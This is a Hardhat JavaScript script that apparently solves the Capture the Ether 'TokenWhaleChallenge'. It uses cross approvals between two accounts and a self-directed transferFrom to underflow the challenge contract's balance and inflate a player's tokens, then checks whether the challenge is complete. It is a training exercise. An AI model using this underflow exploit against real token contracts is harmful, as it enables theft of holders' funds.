require("@nomiclabs/hardhat-ethers");
const { ethers } = require("ethers");
const hre = require("hardhat");

async function main() {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    secondEOA = accounts[1];

    const factory =  await hre.ethers.getContractFactory("TokenWhaleChallenge")
    // contract address after pushing the deploy button in the challenge.
    contract = await factory.attach("0x685Fc49aD44c4D35193a224563f0E13728B53740");
    console.log("Contract TokenWhaleChallenge attached with address: ", contract.address)

    
    await contract.approve(secondEOA.address, 1000000000, {gasPrice: ethers.utils.parseUnits('5','gwei')});
    await contract.approve(deployer.address, 10000000000, {gasPrice: ethers.utils.parseUnits('5','gwei')});
 
    await contract.connect(secondEOA).transferFrom(deployer.address, deployer.address, 999, {gasPrice: ethers.utils.parseUnits('5','gwei')});
    balance = await contract.balanceOf(secondEOA.address);
    console.log('Balance of _player: ', (await contract.balanceOf(deployer.address)).toString())
    console.log('Balance of secondEOA: ', balance.toString())
    
    await contract.connect(secondEOA).transfer(deployer.address, 1000000, {gasPrice: ethers.utils.parseUnits('5','gwei')})
   
    balance = await contract.balanceOf(secondEOA.address);
    console.log('Balance of _player: ', (await contract.balanceOf(deployer.address)).toString())
    console.log('Balance of secondEOA: ', balance.toString())

    console.log('Attack status: ', await contract.isComplete())

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
